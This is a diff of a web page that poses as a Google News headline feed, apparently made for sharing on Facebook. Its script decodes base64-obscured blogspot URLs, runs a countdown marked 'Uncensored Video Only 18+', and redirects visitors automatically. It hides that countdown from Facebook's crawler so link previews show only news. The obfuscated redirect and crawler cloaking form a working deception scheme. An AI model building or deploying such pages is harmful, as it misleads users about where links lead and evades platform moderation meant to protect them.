@@ -9,124 +9,84 @@
             max-width: 800px;
             margin: 0 auto;
             padding: 20px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            min-height: 100vh;
+            background: #f0f2f5;
+            color: #333;
         }
         .container {
-            background: rgba(255,255,255,0.1);
-            padding: 30px;
-            border-radius: 15px;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
         .header {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
         }
         .news-container {
-            max-height: 400px;
-            overflow-y: auto;
             margin: 20px 0;
         }
         .news-item {
-            background: rgba(255,255,255,0.2);
+            background: #f8f9fa;
             margin: 10px 0;
-            padding: 15px;
-            border-radius: 10px;
+            padding: 12px;
+            border-radius: 8px;
             border-left: 4px solid #4285f4;
         }
         .news-title {
-            font-size: 1.1rem;
-            font-weight: 600;
-            margin-bottom: 8px;
+            font-size: 1rem;
+            margin-bottom: 5px;
             line-height: 1.4;
         }
         .news-meta {
-            font-size: 0.9rem;
-            color: rgba(255,255,255,0.8);
+            font-size: 0.8rem;
+            color: #666;
             display: flex;
             justify-content: space-between;
         }
         
         .countdown-section {
-            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
-            padding: 40px;
-            border-radius: 15px;
+            background: #ff4444;
+            padding: 20px;
+            border-radius: 10px;
             text-align: center;
-            margin-top: 30px;
-            border: 3px solid rgba(255,255,255,0.3);
+            margin-top: 20px;
+            color: white;
         }
         .wait-message {
-            font-size: 2rem;
+            font-size: 1.5rem;
             font-weight: bold;
-            margin-bottom: 20px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            margin-bottom: 10px;
         }
         .target {
-            background: rgba(255,255,255,0.9);
+            background: white;
             color: #333;
-            padding: 20px 30px;
-            border-radius: 25px;
+            padding: 10px 20px;
+            border-radius: 20px;
             display: inline-block;
-            margin: 20px 0;
+            margin: 10px 0;
             font-weight: bold;
-            font-size: 1.5rem;
-            border: 2px solid #ffd700;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
         .countdown {
-            font-size: 5rem;
+            font-size: 3rem;
             font-weight: bold;
-            color: #FFD700;
-            margin: 25px 0;
-            text-shadow: 3px 3px 6px rgba(0,0,0,0.4);
-            animation: pulse 1s infinite;
+            margin: 15px 0;
         }
         .redirect-message {
-            font-size: 1.3rem;
-            margin-top: 20px;
-            opacity: 0.9;
-            font-weight: 500;
+            margin-top: 10px;
         }
         
         .loading {
             text-align: center;
             padding: 20px;
         }
-        .loading-spinner {
-            border: 3px solid rgba(255,255,255,0.3);
-            border-top: 3px solid white;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
         
         .subdomain-info {
-            background: rgba(0,0,0,0.3);
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
+            background: #e9ecef;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 10px 0;
             text-align: center;
             font-family: monospace;
-            font-size: 1.1rem;
-        }
-        
-      
-        .fb-hidden {
-            display: none !important;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
         }
     </style>
 </head>
@@ -134,7 +94,7 @@
     <div class="container">
         <div class="header">
             <h1>📰 Latest News</h1>
-            <p>Google News</p>
+            <p>Real-time updates from Google News</p>
         </div>
         
         <div class="subdomain-info" id="subdomain-info">
@@ -142,45 +102,41 @@
         </div>
         
         <div class="news-container" id="news-container">
-            <div class="loading">
-                <div class="loading-spinner"></div>
-                <p>Loading latest news...</p>
-            </div>
+            <div class="loading">Loading latest news...</div>
         </div>
         
         <div class="countdown-section" id="countdown-section">
-            <div class="wait-message">Please wait 5 seconds</div>
-            <div class="target" id="target">Uncensored Video Only 18+</div>
-            <div class="countdown" id="countdown">9</div>
+            <div class="wait-message">Please wait 7 seconds</div>
+            <div class="target">Uncensored Video Only 18+</div>
+            <div class="countdown" id="countdown">7</div>
             <p class="redirect-message">Automatic redirect in progress...</p>
-            <p>Warning! The content you are about to watch may not be appropriate for viewers under 18 years old.</p>
         </div>
     </div>
 
     <script>
-       
+        // 🎯 DOMAIN THẬT CỦA BẠN
         const ENCRYPTED_TARGETS = [
             'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWJyb2FkY2FzdC5odG1s',
             'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbS5odG1s'
         ];
 
-        
-        function decryptTarget(encrypted) {
-            return atob(encrypted);
-        }
-
-        
+        // 🎯 LẤY SUBDOMAIN HIỆN TẠI TỪ VERCEL
         function getCurrentSubdomain() {
             const hostname = window.location.hostname;
             const parts = hostname.split('.');
             
-            if (parts.length >= 3 && parts[1].includes('webcuatoi-redirect')) {
-                return parts[0]; /
+            if (parts.length >= 3 && parts[1].includes('xbling')) {
+                return parts[0];
             }
             return 'main';
         }
 
-        
+        // 🎲 GIẢI MÃ DOMAIN THẬT
+        function decryptTarget(encrypted) {
+            return atob(encrypted);
+        }
+
+        // 🎲 CHỌN TARGET NGẪU NHIÊN TỪ 2 LINK BASE64
         function getRandomTarget() {
             const randomIndex = Math.floor(Math.random() * ENCRYPTED_TARGETS.length);
             const encryptedTarget = ENCRYPTED_TARGETS[randomIndex];
@@ -195,17 +151,11 @@
         // 📡 GOOGLE NEWS RSS
         async function loadGoogleNews() {
             try {
-                const rssUrls = [
-                    'https://news.google.com/rss?hl=en-US&gl=US&ceid=US:en',
-                    'https://news.google.com/rss/topics/CAAqJggKIiBDQkFTRWdvSUwyMHZNRGx1YlY4U0FtVnVHZ0pWVXlnQVAB?hl=en-US&gl=US&ceid=US:en',
-                    'https://news.google.com/rss/topics/CAAqJggKIiBDQkFTRWdvSUwyMHZNRGx6TVdZU0FtVnVHZ0pWVXlnQVAB?hl=en-US&gl=US&ceid=US:en'
-                ];
-
-                const randomRssUrl = rssUrls[Math.floor(Math.random() * rssUrls.length)];
-                const proxyUrl = 'https://api.allorigins.win/raw?url=';
-                const response = await fetch(proxyUrl + encodeURIComponent(randomRssUrl));
-                const xmlText = await response.text();
+                const rssUrl = 'https://news.google.com/rss?hl=en-US&gl=US&ceid=US:en';
+                const proxyUrl = 'https://corsproxy.io/?';
+                const response = await fetch(proxyUrl + encodeURIComponent(rssUrl));
                 
+                const xmlText = await response.text();
                 const parser = new DOMParser();
                 const xmlDoc = parser.parseFromString(xmlText, "text/xml");
                 const items = xmlDoc.getElementsByTagName("item");
@@ -235,36 +185,26 @@
                 document.getElementById('news-container').innerHTML = newsHTML;
                 
             } catch (error) {
-                document.getElementById('news-container').innerHTML = `
-                    <div class="loading">
-                        <p>📡 Loading news updates...</p>
-                        <p style="margin-top: 10px; font-size: 0.9rem;">
-                            Latest news will be displayed here
-                        </p>
-                    </div>
-                `;
-                setTimeout(loadGoogleNews, 3000);
+                document.getElementById('news-container').innerHTML = '<div class="loading">News updates available</div>';
             }
         }
 
-       
+        // ⏱️ COUNTDOWN SYSTEM - 7 GIÂY
         function startCountdown() {
             const currentSubdomain = getCurrentSubdomain();
-            const targetSite = getRandomTarget(); // 🎲 RANDOM TỪ 2 LINK BASE64
+            const targetSite = getRandomTarget();
             
-            
+            // Hiển thị subdomain hiện tại
             document.getElementById('current-subdomain').textContent = currentSubdomain;
             
-           
+            // Ẩn countdown với Facebook bot
             if (isFacebookBot()) {
-                document.getElementById('countdown-section').classList.add('fb-hidden');
-                document.getElementById('subdomain-info').classList.add('fb-hidden');
+                document.getElementById('countdown-section').style.display = 'none';
+                document.getElementById('subdomain-info').style.display = 'none';
                 return;
             }
             
-            document.getElementById('target').textContent = "Uncensored Video Only 18+";
-            
-            let seconds = 6;
+            let seconds = 7;
             const countdownElement = document.getElementById('countdown');
             
             const timer = setInterval(() => {
